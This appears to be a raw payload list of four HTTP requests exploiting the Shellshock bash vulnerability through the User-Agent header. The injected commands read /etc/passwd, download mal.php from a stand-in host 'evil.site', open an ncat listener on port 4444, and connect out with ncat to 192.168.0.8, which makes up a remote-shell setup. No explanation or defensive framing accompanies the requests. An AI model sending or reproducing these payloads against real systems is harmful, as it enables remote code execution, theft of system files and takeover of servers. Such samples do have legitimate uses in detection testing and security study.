GET /index.html HTTP/1.1
Host: example.com
User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
Connection: keep-alive


GET /index.html HTTP/1.1
Host: example.com
User-Agent: () { :;}; /bin/bash -c 'curl -O http://evil.site/mal.php'
Connection: keep-alive


GET /index.html HTTP/1.1
Host: example.com
User-Agent: () { :;}; /bin/bash -c 'ncat -lp 4444'
Connection: keep-alive


GET /index.html HTTP/1.1
Host: example.com
User-Agent: () { :;}; /bin/bash -c 'ncat 192.168.0.8 4444'
Connection: keep-alive


